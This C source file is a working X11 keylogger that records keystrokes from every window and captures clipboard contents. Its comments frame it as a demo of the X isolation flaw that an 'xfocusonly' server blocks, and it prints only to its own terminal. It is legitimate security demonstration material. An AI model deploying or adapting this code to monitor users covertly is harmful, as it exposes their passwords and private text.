/*
 * demo.c - a keylogger. On a stock X server this prints everything you type
 * in any window and everything you copy. On xfocusonly it prints nothing.
 *
 * Build:  gcc -o keylogger keylogger.c -lX11 -lXfixes -lXi
 * Run:    ./keylogger      (then type in another window, copy something)
 * Quit:   Ctrl+C
 */
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/Xatom.h>
#include <X11/keysym.h>
#include <X11/XKBlib.h>
#include <X11/extensions/Xfixes.h>
#include <X11/extensions/XInput2.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void print_clipboard(Display *dpy, Window win, Atom clipboard,
                             Atom utf8, Atom prop) {
    XConvertSelection(dpy, clipboard, utf8, prop, win, CurrentTime);
    XFlush(dpy);

    XEvent ev;
    for (int i = 0; i < 200; i++) { /* ~1s timeout */
        if (XCheckTypedWindowEvent(dpy, win, SelectionNotify, &ev)) break;
        usleep(5000);
    }

    Atom type; int format; unsigned long nitems, after;
    unsigned char *data = NULL;
    if (XGetWindowProperty(dpy, win, prop, 0, ~0L, True, AnyPropertyType,
                            &type, &format, &nitems, &after, &data) == Success && data) {
        printf(" [pasted: %.*s] ", (int)nitems, data);
        fflush(stdout);
        XFree(data);
    }
}

int main(void) {
    Display *dpy = XOpenDisplay(NULL);
    if (!dpy) { fprintf(stderr, "Cannot open display\n"); return 1; }

    Window root = DefaultRootWindow(dpy);
    Window win = XCreateSimpleWindow(dpy, root, 0, 0, 1, 1, 0, 0, 0);

    int xi_opcode, ev_, err_;
    if (!XQueryExtension(dpy, "XInputExtension", &xi_opcode, &ev_, &err_)) {
        fprintf(stderr, "XInput2 not available\n"); return 1;
    }
    int major = 2, minor = 0;
    XIQueryVersion(dpy, &major, &minor);

    unsigned char mask[XIMaskLen(XI_LASTEVENT)] = {0};
    XIEventMask evmask;
    XISetMask(mask, XI_RawKeyPress);
    XISetMask(mask, XI_RawKeyRelease);
    evmask.deviceid = XIAllMasterDevices;
    evmask.mask_len = sizeof(mask);
    evmask.mask = mask;
    XISelectEvents(dpy, root, &evmask, 1);

    int xfixes_event_base, xfixes_error_base;
    int have_xfixes = XFixesQueryExtension(dpy, &xfixes_event_base, &xfixes_error_base);
    Atom clipboard = XInternAtom(dpy, "CLIPBOARD", False);
    Atom utf8 = XInternAtom(dpy, "UTF8_STRING", False);
    Atom prop = XInternAtom(dpy, "KEYTEST_CLIPBOARD", False);
    if (have_xfixes) {
        XFixesSelectSelectionInput(dpy, win, clipboard,
                                    XFixesSetSelectionOwnerNotifyMask);
    }

    KeyCode shiftL = XKeysymToKeycode(dpy, XK_Shift_L);
    KeyCode shiftR = XKeysymToKeycode(dpy, XK_Shift_R);
    int shift_down = 0;

    XFlush(dpy);
    printf("-- typing anywhere shows up below as plain text --\n\n");
    fflush(stdout);

    while (1) {
        XEvent ev;
        XNextEvent(dpy, &ev);

        if (have_xfixes && ev.type == xfixes_event_base + XFixesSelectionNotify) {
            XFixesSelectionNotifyEvent *sev = (XFixesSelectionNotifyEvent *)&ev;
            if (sev->selection == clipboard) print_clipboard(dpy, win, clipboard, utf8, prop);
            continue;
        }

        XGenericEventCookie *c = &ev.xcookie;
        if (c->type != GenericEvent || c->extension != xi_opcode) continue;
        if (!XGetEventData(dpy, c)) continue;

        if (c->evtype == XI_RawKeyPress || c->evtype == XI_RawKeyRelease) {
            XIRawEvent *re = (XIRawEvent *)c->data;
            KeyCode kc = (KeyCode)re->detail;

            if (kc == shiftL || kc == shiftR) {
                shift_down = (c->evtype == XI_RawKeyPress);
                XFreeEventData(dpy, c);
                continue;
            }

            if (c->evtype == XI_RawKeyPress) {
                KeySym ks = XkbKeycodeToKeysym(dpy, kc, 0, shift_down ? 1 : 0);

                if (ks == XK_Return || ks == XK_KP_Enter) {
                    putchar('\n');
                } else if (ks == XK_BackSpace) {
                    printf("\b \b");
                } else if (ks == XK_Tab) {
                    putchar('\t');
                } else if (ks >= 0x20 && ks <= 0x7e) { /* printable ASCII */
                    putchar((char)ks);
                }
                fflush(stdout);
            }
        }

        XFreeEventData(dpy, c);
    }

    return 0;
}
